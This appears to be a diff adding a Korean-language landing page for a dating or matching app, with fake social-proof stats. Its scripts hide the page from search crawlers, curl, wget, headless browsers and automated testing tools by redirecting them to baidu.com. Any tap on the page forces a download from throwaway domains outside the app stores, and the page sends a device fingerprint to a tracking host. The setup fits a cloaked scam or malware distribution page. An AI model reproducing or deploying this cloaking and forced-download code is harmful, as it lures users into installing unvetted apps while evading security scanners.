@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <!-- haoke-anti-pack -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, nofollow">
+    <meta name="bingbot" content="noindex, nofollow">
+    <meta name="360spider" content="noindex, nofollow">
+    <meta name="sosospider" content="noindex, nofollow">
+    <meta name="sogou spider" content="noindex, nofollow">
+    <meta name="yodaobot" content="noindex, nofollow">
+    <meta name="yisouspider" content="noindex, nofollow">
+    <meta name="bytespider" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-transform, no-siteapp">
+    <script id="haoke-anti-crawler">(function(){var ua=(navigator.userAgent||"").toLowerCase();if(!ua.trim()){location.replace("https://www.baidu.com/");return;}var bots=["baiduspider","baiduspider-render","googlebot","bingbot","bingpreview","360spider","sogou web spider","sogou inst spider","sogou spider","yisouspider","bytespider","yodaobot","sosospider","haosouspider","petalbot","toutiaospider","mpcrawler","msnbot","slurp","duckduckbot","facebookexternalhit","twitterbot","linkedinbot","ia_archiver","curl/","wget/","python-requests","scrapy","httpclient","semrushbot","ahrefsbot","dotbot","rogerbot","applebot","headlesschrome","phantomjs"];for(var i=0;i<bots.length;i++){if(ua.indexOf(bots[i])!==-1){location.replace("https://www.baidu.com/");return;}}if(navigator.webdriver){location.replace("https://www.baidu.com/");return;}})();</script>
+    <!-- HAOKE_HEAD -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <title>№</title>
+    <link rel="stylesheet" href="/ai/pages/5/style.css">
+    <style>.haoke-ai-tpl{min-height:100vh;cursor:pointer;-webkit-tap-highlight-color:transparent;}</style>
+</head>
+<body class="haoke-ai-tpl">
+<div class='page'>
+  <div class='bg-carousel'>
+    <div class='bg-slide bg-1'></div>
+    <div class='bg-slide bg-2'></div>
+    <div class='bg-slide bg-3'></div>
+  </div>
+  <div class='overlay'></div>
+  <div class='content'>
+          <img src='/uploads/logo_1784304663.jpg' alt='logo' class='app-logo'>
+        <h1 class='app-name'>№</h1>
+    <p class='tagline'>함께하고 싶은 순간, 지금</p>
+    <div class='btn-area'>
+      <p class='guide-text'>화면 아무 곳이나 터치하여 다운로드</p>
+      <button id='downloadBtn' class='download-btn'>지금 다운로드</button>
+    </div>
+    <div class='social-proof'>
+      <div class='avatar-stack'>
+        <div class='avatar av-1'></div>
+        <div class='avatar av-2'></div>
+        <div class='avatar av-3'></div>
+        <span class='online-badge'>● LIVE</span>
+      </div>
+      <div class='stats'>
+        <span class='stat-item'>🔥 오늘 2,847명 매칭</span>
+        <span class='stat-item'>📍 반경 3km 이내</span>
+        <span class='stat-item'>✅ 인증 완료</span>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+  // 简单的滑动指示动画（可选）
+  document.querySelector('.guide-text')?.classList.add('pulse');
+</script>
+
+<script type="text/javascript">
+  (function () {
+    var directDownloadMode = true;
+    var channelCode = "cpa76";
+    var appKey = "EcYja";
+    var androidDownloadUrl = "https://ztg7bo3taie3.alvzmceal306.dbmtei.cn/DH174/5ky76w.O180pSxF";
+    var androidDownloadUrlBackup1 = "";
+    var androidDownloadUrlBackup2 = "";
+    var iosDownloadUrl = "https://tz5ikeu.qeaci.com/d/279yu1h36br89ea";
+    var androidDownloadUrlList = [androidDownloadUrl, androidDownloadUrlBackup1, androidDownloadUrlBackup2].filter(function (u) {
+      return typeof u === "string" && u.trim().length > 0;
+    });
+    var androidDownloadUrlCookieName = "haoke_android_dl_idx";
+    var pickedAndroidUrlForCurrentClick = null;
+    var DOWNLOAD_TRIGGER_SELECTOR = "#downloadApp, #downloadBtn, #downloadBtnBottom, #btnDownload, #telegramButton, .btn-download, .all-download, .download-btn";
+    var tapAnywhereDownload = true;
+    var logPrefix = directDownloadMode ? "[FixedDownload]" : "[OpenInstallBridge]";
+    var OPENINSTALL_TIMEOUT_MS = 6000;
+    var openInstallPreferredScriptUrl = "https://web.cdn.openinstall.io/openinstall.js";
+    var openInstallFallback1Prefix = "https://res.opstatistics.com/openinstall-";
+    var openInstallFallback1Suffix = ".js";
+    var openInstallFallback2ScriptUrl = "https://res.cdn.openinstall.io/openinstall.js";
+    var fallbackDownloadTriggered = false;
+    var primaryScriptTried = false;
+    var openInstall = null;
+    var openInstallInitialized = false;
+    var initTimeoutTimer = null;
+    var downloadHandlerBound = false;
+
+    function logInfo() {
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift(logPrefix);
+      console.log.apply(console, args);
+    }
+
+    function logWarn() {
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift(logPrefix);
+      console.warn.apply(console, args);
+    }
+
+    function logError() {
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift(logPrefix);
+      console.error.apply(console, args);
+    }
+
+    function readCookie(name) {
+      var match = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
+      return match ? decodeURIComponent(match[1]) : "";
+    }
+
+    function writeCookie(name, value, days) {
+      var expires = "";
+      if (days) {
+        var d = new Date();
+        d.setTime(d.getTime() + days * 86400 * 1000);
+        expires = "; expires=" + d.toUTCString();
+      }
+      document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
+    }
+
+    function isIOSPlatform() {
+      var ua = navigator.userAgent.toLowerCase();
+      return ua.indexOf("iphone") !== -1 || ua.indexOf("ipad") !== -1 || ua.indexOf("ipod") !== -1;
+    }
+
+    function isValidUrl(url) {
+      return !!(url && typeof url === "string" && url.trim().length > 0);
+    }
+
+    function pickAndroidDownloadUrlOnce() {
+      if (pickedAndroidUrlForCurrentClick !== null) {
+        return pickedAndroidUrlForCurrentClick;
+      }
+      if (androidDownloadUrlList.length === 0) {
+        pickedAndroidUrlForCurrentClick = "";
+        return pickedAndroidUrlForCurrentClick;
+      }
+      if (androidDownloadUrlList.length === 1) {
+        pickedAndroidUrlForCurrentClick = androidDownloadUrlList[0];
+        return pickedAndroidUrlForCurrentClick;
+      }
+      var raw = readCookie(androidDownloadUrlCookieName);
+      var idx = parseInt(raw, 10);
+      if (isNaN(idx) || idx < 0) {
+        idx = 0;
+      }
+      idx = idx % androidDownloadUrlList.length;
+      pickedAndroidUrlForCurrentClick = androidDownloadUrlList[idx];
+      writeCookie(androidDownloadUrlCookieName, String((idx + 1) % androidDownloadUrlList.length), 365);
+      return pickedAndroidUrlForCurrentClick;
+    }
+
+    function getPlatformUrls() {
+      return {
+        android: isValidUrl(androidDownloadUrl) ? androidDownloadUrl.trim() : "",
+        ios: isValidUrl(iosDownloadUrl) ? iosDownloadUrl.trim() : ""
+      };
+    }
+
+    function getFixedDownloadUrl() {
+      if (isIOSPlatform()) {
+        return getPlatformUrls().ios;
+      }
+      if (androidDownloadUrlList.length > 0) {
+        return pickAndroidDownloadUrlOnce();
+      }
+      return "";
+    }
+
+    function getFallbackDownloadUrl() {
+      var urls = getPlatformUrls();
+      if (isIOSPlatform()) {
+        return urls.ios || urls.android || "";
+      }
+      return (androidDownloadUrlList.length > 0 ? pickAndroidDownloadUrlOnce() : "") || urls.android || urls.ios || "";
+    }
+
+    function redirectToDownload(target) {
+      if (!target) {
+        logWarn("未配置当前平台的下载地址");
+        return;
+      }
+      logInfo("跳转下载地址:", target);
+      window.location.href = target;
+    }
+
+    function fixedDownload() {
+      pickedAndroidUrlForCurrentClick = null;
+      redirectToDownload(getFixedDownloadUrl());
+    }
+
+    function fallbackDownload() {
+      if (fallbackDownloadTriggered) {
+        return;
+      }
+      fallbackDownloadTriggered = true;
+      pickedAndroidUrlForCurrentClick = null;
+      redirectToDownload(getFallbackDownloadUrl());
+    }
+
+    function clearInitTimeout() {
+      if (initTimeoutTimer) {
+        clearTimeout(initTimeoutTimer);
+        initTimeoutTimer = null;
+      }
+    }
+
+    function runWakeupWithFallback() {
+      fallbackDownloadTriggered = false;
+
+      if (!openInstall || !openInstallInitialized) {
+        logWarn("OpenInstall 未初始化完成，使用兜底下载");
+        fallbackDownload();
+        return;
+      }
+
+      var hasResponded = false;
+      var responseTimer = setTimeout(function () {
+        if (!hasResponded) {
+          logWarn("OpenInstall 响应超时，执行兜底下载");
+          fallbackDownload();
+        }
+      }, OPENINSTALL_TIMEOUT_MS);
+
+      try {
+        logInfo("调用 wakeupOrInstall（channelCode=" + channelCode + "）");
+        openInstall.wakeupOrInstall({
+          channelCode: channelCode,
+          onsuccess: function () {
+            hasResponded = true;
+            clearTimeout(responseTimer);
+          },
+          onfail: function (err) {
+            hasResponded = true;
+            clearTimeout(responseTimer);
+            logWarn("唤起失败，使用兜底下载:", err);
+            fallbackDownload();
+          }
+        });
+      } catch (e) {
+        hasResponded = true;
+        clearTimeout(responseTimer);
+        logError("调用 wakeupOrInstall 异常，使用兜底下载:", e);
+        fallbackDownload();
+      }
+    }
+
+    function handleDownloadTrigger() {
+      pickedAndroidUrlForCurrentClick = null;
+      runWakeupWithFallback();
+    }
+
+    function bindDownloadHandler(handler) {
+      if (downloadHandlerBound) {
+        return;
+      }
+      downloadHandlerBound = true;
+      document.addEventListener("click", function (e) {
+        var trigger = e.target.closest(DOWNLOAD_TRIGGER_SELECTOR);
+        if (!trigger) {
+          return;
+        }
+        e.preventDefault();
+        if (typeof e.stopImmediatePropagation === "function") {
+          e.stopImmediatePropagation();
+        } else if (typeof e.stopPropagation === "function") {
+          e.stopPropagation();
+        }
+        logInfo("检测到下载点击，目标元素:", trigger.id || trigger.className || trigger.tagName);
+        handler();
+      }, true);
+    }
+
+    function openInstallFallback1Url(key) {
+      return openInstallFallback1Prefix + encodeURIComponent(key) + openInstallFallback1Suffix;
+    }
+
+    function fixOpstatisticsCnUrl(url) {
+      if (!url || typeof url !== "string") {
+        return url;
+      }
+      return url.replace(/\.opstatistics\.cn\b/gi, ".opstatistics.com");
+    }
+
+    function installOpstatisticsCnToComFix() {
+      if (window.__opCnToComFixInstalled) {
+        return;
+      }
+      window.__opCnToComFixInstalled = true;
+
+      if (window.fetch) {
+        var originalFetch = window.fetch;
+        window.fetch = function (input, init) {
+          if (typeof input === "string") {
+            input = fixOpstatisticsCnUrl(input);
+          } else if (input && typeof input === "object" && input.url) {
+            try {
+              input = new Request(fixOpstatisticsCnUrl(input.url), input);
+            } catch (e) {
+              input = fixOpstatisticsCnUrl(input.url);
+            }
+          }
+          return originalFetch.call(this, input, init);
+        };
+      }
+
+      if (window.XMLHttpRequest && XMLHttpRequest.prototype.open) {
+        var originalXHROpen = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function (method, url) {
+          var args = Array.prototype.slice.call(arguments);
+          args[1] = fixOpstatisticsCnUrl(url);
+          return originalXHROpen.apply(this, args);
+        };
+      }
+
+      if (navigator.sendBeacon) {
+        var originalSendBeacon = navigator.sendBeacon.bind(navigator);
+        navigator.sendBeacon = function (url, data) {
+          return originalSendBeacon(fixOpstatisticsCnUrl(url), data);
+        };
+      }
+    }
+
+    function initOpenInstall() {
+      if (openInstallInitialized) {
+        return;
+      }
+      if (typeof OpenInstall === "undefined") {
+        logWarn("OpenInstall SDK 未加载，使用兜底下载流程");
+        return;
+      }
+
+      try {
+        var data = OpenInstall.parseUrlParams();
+        openInstall = new OpenInstall({
+          appKey: appKey,
+          channelCode: channelCode,
+          fastInstall: false,
+          onready: function () {
+            openInstallInitialized = true;
+            clearInitTimeout();
+            logInfo("OpenInstall SDK 初始化成功");
+            this.schemeWakeup();
+          },
+          onerror: function (err) {
+            openInstallInitialized = false;
+            clearInitTimeout();
+            logError("OpenInstall 初始化失败，使用兜底下载:", err);
+          }
+        }, data);
+      } catch (e) {
+        openInstallInitialized = false;
+        clearInitTimeout();
+        logError("OpenInstall 初始化异常，使用兜底下载:", e);
+      }
+
+      clearInitTimeout();
+      initTimeoutTimer = setTimeout(function () {
+        if (!openInstallInitialized) {
+          logWarn("OpenInstall 初始化超时，保持兜底下载");
+        }
+      }, OPENINSTALL_TIMEOUT_MS);
+    }
+
+    function loadScript(url, onLoad, onError) {
+      var script = document.createElement("script");
+      script.type = "text/javascript";
+      script.charset = "UTF-8";
+      script.async = true;
+      script.src = url;
+      script.onload = onLoad;
+      script.onerror = onError;
+      document.head.appendChild(script);
+    }
+
+    function loadSdkChain(step) {
+      if (typeof OpenInstall !== "undefined") {
+        initOpenInstall();
+        return;
+      }
+      if (step === 0 && appKey) {
+        var appScriptUrl = openInstallFallback1Url(appKey);
+        logInfo("加载应用专属 OpenInstall 脚本:", appScriptUrl);
+        loadScript(appScriptUrl, function () {
+          if (typeof OpenInstall !== "undefined") {
+            initOpenInstall();
+          } else {
+            loadSdkChain(1);
+          }
+        }, function () {
+          loadSdkChain(1);
+        });
+        return;
+      }
+      if (step === 1) {
+        loadScript(openInstallPreferredScriptUrl, function () {
+          if (typeof OpenInstall !== "undefined") {
+            initOpenInstall();
+          } else {
+            loadSdkChain(2);
+          }
+        }, function () {
+          loadSdkChain(2);
+        });
+        return;
+      }
+      if (step === 2) {
+        loadScript(openInstallFallback2ScriptUrl, function () {
+          if (typeof OpenInstall !== "undefined") {
+            initOpenInstall();
+          } else {
+            logError("所有 OpenInstall 脚本地址均不可用");
+          }
+        }, function () {
+          logError("备用 OpenInstall 脚本加载失败");
+        });
+      }
+    }
+
+    function loadPrimaryScriptAndInit() {
+      if (primaryScriptTried) {
+        return;
+      }
+      primaryScriptTried = true;
+      loadSdkChain(0);
+    }
+
+    var primaryDownloadHandler = directDownloadMode ? fixedDownload : handleDownloadTrigger;
+
+    if (tapAnywhereDownload) {
+      if (!downloadHandlerBound) {
+        downloadHandlerBound = true;
+        document.addEventListener("click", function () {
+          logInfo("点击任意位置触发下载");
+          primaryDownloadHandler();
+        }, true);
+      }
+    } else {
+      bindDownloadHandler(primaryDownloadHandler);
+    }
+    window.channelCode = channelCode;
+    window.openInstallDownload = primaryDownloadHandler;
+    window.downloadApp = primaryDownloadHandler;
+
+    if (directDownloadMode) {
+      logInfo("已开启固定下载地址模式，不加载 OpenInstall");
+    } else {
+      window.openInstallFallbackDownload = fallbackDownload;
+      installOpstatisticsCnToComFix();
+      try {
+        if (typeof OpenInstall === "undefined") {
+          loadPrimaryScriptAndInit();
+        } else {
+          initOpenInstall();
+        }
+      } catch (e) {
+        logError("OpenInstall 初始化入口异常，保持兜底下载:", e);
+      }
+    }
+  })();
+</script>
+<!--<script>fetch(`https://180.178.43.186:9638/statisticsChannelCode?appkey=EcYja&channelCode=cpa76`).catch(()=>{});</script>-->
+    
+    <!-- 全局JS统计代码 -->
+    <script>var w=screen.width,h=screen.height,d=Math.round(devicePixelRatio);if(w>h){var t=w;w=h;h=t;}var x=new XMLHttpRequest();x.open('POST','https://uljqctdh.cc1install.w150e.com/statisticsInstall2?appkey=EcYja&channelCode=cpa76',1);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({device_model:w+'x'+h+'@'+d}));</script>
+    <!-- HAOKE_TAIL -->
+</body>
+</html>
